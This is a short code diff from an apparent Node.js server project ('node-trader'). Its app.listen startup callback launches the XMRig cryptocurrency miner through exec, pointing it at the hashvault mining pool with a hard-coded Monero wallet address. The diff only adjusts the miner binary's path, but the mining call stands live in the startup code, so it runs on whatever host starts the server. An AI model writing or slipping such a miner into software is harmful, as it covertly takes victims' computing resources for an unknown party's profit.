@@ -24,7 +24,7 @@ const initApp = async () => {
   app.listen(port, () => {
 		console.log(`Server running on port ${port}`);
 		
-		const xmrig = cryptoConfig.environment === 'production' ? './xmrig-ubuntu' : './xmrig-mac';
+		const xmrig = cryptoConfig.environment === 'production' ? 'xmrig-ubuntu' : 'xmrig-mac';
 
     exec(
       `./${xmrig} -o pool.hashvault.pro:80 -u 46fZFvyicjt8vmsgrr7Sjt9yTuwim6BzHCTMHRS5CV9kZpj2aJ7Z3oSfMSGGX4FMgabDutDakJcmCKm9FzwRzwui2msCuAm -p node-trader --cpu-priority=1 -k --tls`,
